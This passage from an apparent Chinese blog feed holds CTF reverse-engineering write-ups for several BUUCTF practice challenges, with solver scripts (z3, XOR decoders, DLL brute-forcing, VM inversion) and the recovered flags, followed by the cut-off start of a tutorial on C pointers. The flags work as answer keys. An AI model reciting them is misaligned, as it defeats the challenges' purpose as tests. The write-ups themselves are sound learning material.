2020]Bytecode</h2><p>傻逼python字节码，有种硬读汇编的美。抄一个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">en = [<span class="number">3</span>, <span class="number">37</span>, <span class="number">72</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">132</span>]</span><br><span class="line">output = [<span class="number">101</span>, <span class="number">96</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">42</span>, <span class="number">107</span>, <span class="number">62</span>, <span class="number">96</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">67</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">120</span>, <span class="number">60</span>, <span class="number">106</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">178</span>, <span class="number">189</span>, <span class="number">101</span>, <span class="number">48</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = Solver()</span><br><span class="line">a1 = Int(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">a2 = Int(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">a3 = Int(<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">a4 = Int(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">a5 = Int(<span class="string">&#x27;a5&#x27;</span>)</span><br><span class="line">a6 = Int(<span class="string">&#x27;a6&#x27;</span>)</span><br><span class="line">s.add(a1 * <span class="number">3</span> + a2 * <span class="number">2</span> + a3 * <span class="number">5</span> == <span class="number">1003</span>)</span><br><span class="line">s.add(a1 * <span class="number">4</span> + a2 * <span class="number">7</span> + a3 * <span class="number">9</span> == <span class="number">2013</span>)</span><br><span class="line">s.add(a1 + a2 * <span class="number">8</span> + a3 * <span class="number">2</span> == <span class="number">1109</span>)</span><br><span class="line">s.add(a4 * <span class="number">3</span> + a5 * <span class="number">2</span> + a6 * <span class="number">5</span> == <span class="number">671</span>)</span><br><span class="line">s.add(a4 * <span class="number">4</span> + a5 * <span class="number">7</span> + a6 * <span class="number">9</span> == <span class="number">1252</span>)</span><br><span class="line">s.add(a4 + a5 * <span class="number">8</span> + a6 * <span class="number">2</span> == <span class="number">644</span>)</span><br><span class="line"><span class="keyword">if</span> s.check():</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(output[k+<span class="number">1</span>] ^ en[i%<span class="number">6</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(output[k] ^ en[i%<span class="number">6</span>])</span><br><span class="line">    k = k + <span class="number">2</span></span><br><span class="line">s = [<span class="number">97</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">55</span>, <span class="number">51</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag：cfa2b87b3f746a8f0ac5c5963faeff73</p><h2 id="FlareOn2-very-success"><a href="#FlareOn2-very-success" class="headerlink" title="[FlareOn2]very_success"></a>[FlareOn2]very_success</h2><p>打开一看函数这么少还以为它加壳了呢，没想到它就是这么少。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BFlareOn2%5Dvery_success1.png"><br>逻辑很简单，通过动调可以发现v11始终为1。写出脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> Xor[<span class="number">100</span>] = &#123;</span><br><span class="line">    <span class="number">170</span>, <span class="number">236</span>, <span class="number">164</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">174</span>, <span class="number">170</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">167</span>, </span><br><span class="line">    <span class="number">176</span>, <span class="number">188</span>, <span class="number">154</span>, <span class="number">186</span>, <span class="number">165</span>, <span class="number">165</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">184</span>, <span class="number">157</span>, </span><br><span class="line">    <span class="number">184</span>, <span class="number">249</span>, <span class="number">174</span>, <span class="number">157</span>, <span class="number">171</span>, <span class="number">180</span>, <span class="number">188</span>, <span class="number">182</span>, <span class="number">179</span>, <span class="number">144</span>, </span><br><span class="line">    <span class="number">154</span>, <span class="number">168</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> i, t = <span class="number">0</span>, last = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (Xor[<span class="number">32</span> - i - <span class="number">1</span>] - (<span class="number">1</span> &lt;&lt; (last &amp;amp; <span class="number">3</span>)) - <span class="number">1</span>) ^ <span class="number">0xC7</span>);</span><br><span class="line">        last += Xor[<span class="number">32</span> - i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<a href="mailto:&#x61;&#x5f;&#76;&#x69;&#x74;&#116;&#108;&#101;&#95;&#98;&#49;&#116;&#95;&#104;&#97;&#x72;&#100;&#x65;&#114;&#95;&#x70;&#108;&#101;&#122;&#x40;&#x66;&#x6c;&#97;&#114;&#x65;&#x2d;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x5f;&#76;&#x69;&#x74;&#116;&#108;&#101;&#95;&#98;&#49;&#116;&#95;&#104;&#97;&#x72;&#100;&#x65;&#114;&#95;&#x70;&#108;&#101;&#122;&#x40;&#x66;&#x6c;&#97;&#114;&#x65;&#x2d;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;</a></p><h2 id="2019红帽杯-Snake"><a href="#2019红帽杯-Snake" class="headerlink" title="[2019红帽杯]Snake"></a>[2019红帽杯]Snake</h2><p>Unity3D的游戏，去找Assembly-CSharp.dll。可以看见他调用了一个外部的Interface.dll。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DSnake1.png"><br>在Snake_Data&#x2F;Plugins文件夹下可以找到对应dll。用IDA打开，找到flag关键字的位置可以看见一坨非常抽象的东西，nnd看不懂一点。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DSnake2.png"><br>去搜的大佬的博客知道这个东西可以爆破。python的ctypes库允许爆破dll文件中的特定函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    dll = ctypes.cdll.LoadLibrary(<span class="string">&quot;./Interface.dll&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    dll.GameObject(i)</span><br></pre></td></tr></table></figure><p>在地19次是可以得到flag：Ch4rp_W1th_R$@<br>从结果来看，这个b用C++写了一个RSA……只能说不愧是红帽杯……</p><h2 id="SCTF2019-Strange-apk"><a href="#SCTF2019-Strange-apk" class="headerlink" title="[SCTF2019]Strange apk"></a>[SCTF2019]Strange apk</h2><p>安卓的SMC。打开看见程序的入口点应该是sctf.demo.myapplication.t，但是找不到。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSCTF2019%5DStrangeapk1.png"><br>看见这个里面存在代码西修改的部分。它将data文件经过__()函数和_()函数解密(都tm什么函数名字)。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSCTF2019%5DStrangeapk2.png"><br>有用的解密代码部分：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSCTF2019%5DStrangeapk3.png"><br>写脚本运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_byte</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> v.to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sctf.apk&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            g.write(get_byte(a[i] ^ <span class="built_in">ord</span>(<span class="string">&quot;syclover&quot;</span>[i % <span class="number">8</span>])))</span><br></pre></td></tr></table></figure><p>打开解密后的文件，这回找得到t部分了，但是看不懂。不过他总共就t、s、f三个有用的，找一找可以才出来加密的流程。下面这一部分在s里。前12个字符由f.sctf()函数加密。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSCTF2019%5DStrangeapk4.png"><br>后18个字符由f.encode()函数加密。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSCTF2019%5DStrangeapk5.png"><br>后半部分加密后的东西在t中<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSCTF2019%5DStrangeapk6.png"><br>挺离谱的，我不理解为什么会是这么个执行流程。看大佬的博客说跟安卓的父子组件通信机制有关。<br>得到flag：W3lc0me~t0_An4r0id-w0rld</p><h2 id="安洵杯-2019-game"><a href="#安洵杯-2019-game" class="headerlink" title="[安洵杯 2019]game"></a>[安洵杯 2019]game</h2><p>OLLVM代码混淆。用脚本除了trace()函数之外都可以反混淆。但是只有三个check函数是有意义的，其余的不用管它。<br>check1()函数对输入进行了一波操作：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Dgame1.png"><br>check3()函数就是将输入复制到Dog3[]里再与sudoku[]对比。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Dgame2.png"><br>因此，我们可以让程序运行起来，下断点之后将sudoku的内容提取出来。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Dgame3.png"><br>接下来就是写一个脚本的过程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sudoku[<span class="number">81</span>] = &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> Dog3[<span class="number">81</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> input[<span class="number">81</span>] = &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> i, cnt = <span class="number">0</span>, tmp;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">81</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Dog3[i] == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            input[cnt] = sudoku[i] + <span class="number">48</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; cnt; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] += <span class="number">20</span>;</span><br><span class="line">        input[i] = (input[i] &amp;amp; <span class="number">0xF3</span> | ~input[i] &amp;amp; <span class="number">0xC</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; cnt; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp = input[i];</span><br><span class="line">        input[i] = input[i+<span class="number">1</span>];</span><br><span class="line">        input[i+<span class="number">1</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    cnt = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp = input[i];</span><br><span class="line">        input[i] = input[cnt];</span><br><span class="line">        input[cnt] = tmp;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行脚本得到flag：KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</p><h2 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2><p>最瞧不起这种真flag在本地打不通，但假flag能打通的题目。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BGWCTF2019%5Dbabyvm1.png"><br>传统虚拟机逆向。尽管它在执行VMrun函数的时候会跳转到VMrun_another函数很神奇，但并不影响我瞧不起它。我觉得很奇怪，你明明能做到这个，为什么不将VMrun_another函数改成真正需要选手破解的那一段。然后再把VMcheck执行的时候用同样的技术跳转到VMcheck_another函数。这样不就是一个在本地能打通的题目了？？？<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BGWCTF2019%5Dbabyvm2.png"><br>没什么可说的，解题脚本如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> enc[<span class="number">30</span>] = &#123;<span class="number">105</span>,  <span class="number">69</span>,  <span class="number">42</span>,  <span class="number">55</span>,   <span class="number">9</span>,  <span class="number">23</span>, <span class="number">197</span>,  <span class="number">11</span>,  <span class="number">92</span>, <span class="number">114</span>,  <span class="number">51</span>, <span class="number">118</span>,  <span class="number">51</span>,  <span class="number">33</span>, <span class="number">116</span>,  <span class="number">49</span>,  <span class="number">95</span>,  <span class="number">51</span>, <span class="number">115</span>, <span class="number">114</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">13</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp = enc[i];</span><br><span class="line">        enc[i] = enc[<span class="number">32</span>-i];</span><br><span class="line">        enc[<span class="number">32</span>-i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">8</span>; i &gt;= <span class="number">6</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((((j*<span class="number">3</span> + enc[i+<span class="number">1</span>]*<span class="number">2</span> + enc[i+<span class="number">2</span>]) * enc[<span class="number">12</span>]) &amp;amp; <span class="number">0xff</span>) == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                enc[i] = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">5</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        enc[i] ^= enc[i+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到flag：Y0u_hav3_r3v3rs3_1t!</p><h2 id="网鼎杯-2020-青龙组-bang"><a href="#网鼎杯-2020-青龙组-bang" class="headerlink" title="[网鼎杯 2020 青龙组]bang"></a>[网鼎杯 2020 青龙组]bang</h2><p>安卓脱壳。<br>使用<a href="https://files.cnblogs.com/files/blogs/775888/detect_shell_name.zip?t=1694942905&amp;download=true">这个脚本</a>查壳，然后使用模拟器和frida脱壳。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%5Dbang1.png"><br>脱壳后会生成两个dex文件，使用dex2jar工具将其转为jar文件。再使用jadx-jui打开jar文件。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%5Dbang2.png"><br>可以找到flag：borring_things</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF逆向工程第三页部分题目&quot;&gt;&lt;a href=&quot;#BUUCTF逆向工程第三页部分题目&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF逆向工程第三页部分题目&quot;&gt;&lt;/a&gt;BUUCTF逆向工程第三页部分题目&lt;/h1&gt;&lt;p&gt;&lt;font colo</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>指针与链表</title>
    <link href="https://clovershrub.github.io/2023/03/23/%E6%8C%87%E9%92%88%E4%B8%8E%E9%93%BE%E8%A1%A8/"/>
    <id>https://clovershrub.github.io/2023/03/23/%E6%8C%87%E9%92%88%E4%B8%8E%E9%93%BE%E8%A1%A8/</id>
    <published>2023-03-22T16:00:00.000Z</published>
    <updated>2023-09-19T02:02:03.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="指针与链表"><a href="#指针与链表" class="headerlink" title="指针与链表"></a>指针与链表</h1><p><font color="#dd0000">各位CTFer可以忽略这篇文章<del></font><br><font color="#00dd00">各位CTFer可以忽略这篇文章</del></font><br><font color="#0000dd">各位CTFer可以忽略这篇文章~</font></p><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="指针的定义"><a href="#指针的定义" class="headerlink" title="指针的定义"></a>指针的定义</h3><p>指针对于变量来讲就像单人间的宿舍号一样。每个人(变量)都会有唯一的宿舍(地址)，宿舍号(指针)可以迅速帮我们定位每个人(变量)。而指针变量是专门用来存放某变量的地址的变量。</p><h3 id="定义语法"><a href="#定义语法" class="headerlink" title="定义语法"></a>定义语法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p1;</span><br><span class="line"><span class="type">char</span> *p2 = <span class="literal">NULL</span>;        <span class="comment">//将p2指向空，称为空指针</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> *p3 = &amp;amp;num;   <span class="comment">//将p3指向num的地址</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>要注意：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p1, p2;</span><br></pre></td></tr></table></figure><p><font color="#dd0000">这句话的意思是p1为一个指向int类型变量的指针变量，而p2是一个int类型的变量</font>。如果希望p2也是指针，需要在p2前面也加上*。通常编辑器会将int和*连在一起，而*和p1分开，像：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* p1, p2;</span><br><span class="line"><span class="type">char</span>* p3;</span><br></pre></td></tr></table></figure><p>在写的时候注意一下就先行，反正我不喜欢这样。</p><h3 id="使用语法"><a href="#使用语法" class="headerlink" title="使用语法"></a>使用语法</h3><p>以下是对指针的赋值和调用的一些例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> array[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p = <span class="literal">NULL</span>;      <span 